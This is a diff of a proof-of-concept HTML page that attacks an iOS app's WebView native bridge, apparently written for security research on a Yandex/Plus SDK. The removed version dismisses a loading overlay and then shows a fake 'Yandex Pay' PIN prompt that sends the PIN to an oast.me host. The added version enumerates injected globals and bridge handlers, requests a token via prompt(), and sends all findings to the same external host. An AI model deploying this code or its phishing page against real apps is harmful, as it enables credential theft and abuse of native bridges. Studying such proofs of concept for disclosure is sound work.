@@ -1,34 +1,91 @@
 <html><head><title>PoC</title></head>
 <body>
 <script>
-// The iOS bridge is nativeYB.postMessage()
-// Send READY message to dismiss loading overlay
+// Comprehensive probe: find ALL non-standard window properties and try every
+// possible way to send messages to native
 
-var readyMsg = JSON.stringify({type:"READY",trackId:"12345678-1234-1234-1234-123456789abc"});
+var data = {};
 
-// Try all possible ways to send to native
-try { window.nativeYB.postMessage(readyMsg); } catch(e){}
-try { window.webkit.messageHandlers.nativeYB.postMessage(readyMsg); } catch(e){}
-try { window.__plusSDKMobileCompat.onMessage(readyMsg); } catch(e){}
+// 1. Find all non-default window properties (native injections)
+var defaultProps = ["location","document","window","self","top","parent","frames","opener","closed","length","name","history","customElements","locationbar","menubar","personalbar","scrollbars","statusbar","toolbar","status","frameElement","navigator","clientInformation","screen","innerWidth","innerHeight","scrollX","pageXOffset","scrollY","pageYOffset","screenX","screenLeft","screenY","screenTop","outerWidth","outerHeight","devicePixelRatio","performance","origin","isSecureContext","crypto","close","focus","blur","postMessage","stop","open","alert","confirm","prompt","print","find","scroll","scrollTo","scrollBy","getComputedStyle","matchMedia","moveTo","moveBy","resizeTo","resizeBy","getSelection","reportError","atob","btoa","setTimeout","clearTimeout","setInterval","clearInterval","queueMicrotask","createImageBitmap","structuredClone","fetch","caches","indexedDB","sessionStorage","localStorage"];
 
-// Report what happened
-setTimeout(function(){
-  var info = {
-    hasNativeYB: typeof window.nativeYB,
-    nativeYBKeys: [],
-    sent: true
-  };
-  try { info.nativeYBKeys = Object.keys(window.nativeYB || {}); } catch(e){ info.nativeYBErr = e.message; }
-  try { info.hasWebkitNativeYB = !!(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.nativeYB); } catch(e){}
+var injected = [];
+for (var k in window) {
+  if (defaultProps.indexOf(k) === -1 && k.indexOf("on") !== 0 && k.indexOf("webkit") !== 0) {
+    try {
+      var val = window[k];
+      var info = {name: k, type: typeof val};
+      if (typeof val === 'object' && val !== null) {
+        info.keys = Object.keys(val);
+        info.ownProps = Object.getOwnPropertyNames(val);
+      }
+      if (typeof val === 'function') {
+        info.str = val.toString().substring(0, 200);
+      }
+      injected.push(info);
+    } catch(e) {
+      injected.push({name: k, error: e.message});
+    }
+  }
+}
+data.injectedGlobals = injected;
 
-  fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/native-yb?" + encodeURIComponent(JSON.stringify(info)));
-}, 1000);
+// 2. Check webkit.messageHandlers thoroughly
+data.webkitInfo = {};
+try {
+  var wk = window.webkit;
+  data.webkitInfo.exists = !!wk;
+  data.webkitInfo.keys = Object.keys(wk || {});
+  data.webkitInfo.ownProps = Object.getOwnPropertyNames(wk || {});
+  if (wk && wk.messageHandlers) {
+    data.webkitInfo.mhExists = true;
+    data.webkitInfo.mhKeys = Object.keys(wk.messageHandlers);
+    data.webkitInfo.mhOwnProps = Object.getOwnPropertyNames(wk.messageHandlers);
+    // Try to access common handler names and see which throw vs return undefined
+    var handlers = ["plus","plusSDK","native","nativeYB","bridge","app","sdk","message",
+      "ready","READY","compat","plusCompat","plusMobileCompat","smartWebview",
+      "PlusHomeSDK","plusHomeSDK","fintech","bank","payment","webview",
+      "callNative","jsbridge","YBridge","ybridge","plusBridge"];
+    var foundHandlers = [];
+    handlers.forEach(function(h) {
+      try {
+        var handler = wk.messageHandlers[h];
+        if (handler) foundHandlers.push(h + ":EXISTS");
+      } catch(e) {
+        // TypeError = doesn't exist, other errors = might exist
+        if (e.name !== "TypeError") foundHandlers.push(h + ":err:" + e.message);
+      }
+    });
+    data.webkitInfo.foundHandlers = foundHandlers;
+  }
+} catch(e) {
+  data.webkitInfo.error = e.message;
+}
 
-// If overlay dismisses, show phishing UI after 3s
-setTimeout(function(){
-  document.body.style.background = '#111';
-  document.body.innerHTML = '<div style="padding:40px;text-align:center;font-family:-apple-system;color:#fff;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;"><h2 style="margin-bottom:20px;">Yandex Pay</h2><p style="color:#aaa;margin-bottom:30px;">Confirm your identity</p><input type="password" id="pin" placeholder="Enter PIN" maxlength="4" style="font-size:32px;padding:15px;width:180px;text-align:center;border-radius:12px;border:1px solid #444;background:#222;color:#fff;"><br><br><button onclick="fetch(\'https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/pin?\'+document.getElementById(\'pin\').value)" style="padding:15px 50px;background:#fc0;color:#000;border:none;border-radius:12px;font-size:18px;font-weight:bold;">Confirm</button></div>';
-}, 3000);
+// 3. Try prompt() - some iOS WebViews intercept prompt for communication
+try {
+  var promptResult = prompt("__PLUS_SDK_GET_TOKEN__");
+  data.promptResult = promptResult;
+} catch(e) {
+  data.promptError = e.message;
+}
+
+// 4. Check if there's a custom URL scheme handler by monitoring
+data.plusSDKCompat = {};
+try {
+  var sdk = window.__plusSDKMobileCompat;
+  data.plusSDKCompat.type = typeof sdk;
+  data.plusSDKCompat.keys = Object.keys(sdk);
+  data.plusSDKCompat.ownProps = Object.getOwnPropertyNames(sdk);
+  data.plusSDKCompat.onMessageType = typeof sdk.onMessage;
+  // Check if onMessage is a native function or JS function
+  data.plusSDKCompat.onMessageStr = (sdk.onMessage || "").toString ? sdk.onMessage.toString().substring(0, 200) : "no toString";
+} catch(e) {
+  data.plusSDKCompat.error = e.message;
+}
+
+fetch("https://da7db8p9tmut9738sbb0r4setdbsf769t.oast.me/full-probe?" + encodeURIComponent(JSON.stringify(data)));
+document.title = "Probed: " + (injected.length) + " injected globals";
 </script>
 </body>
 </html>
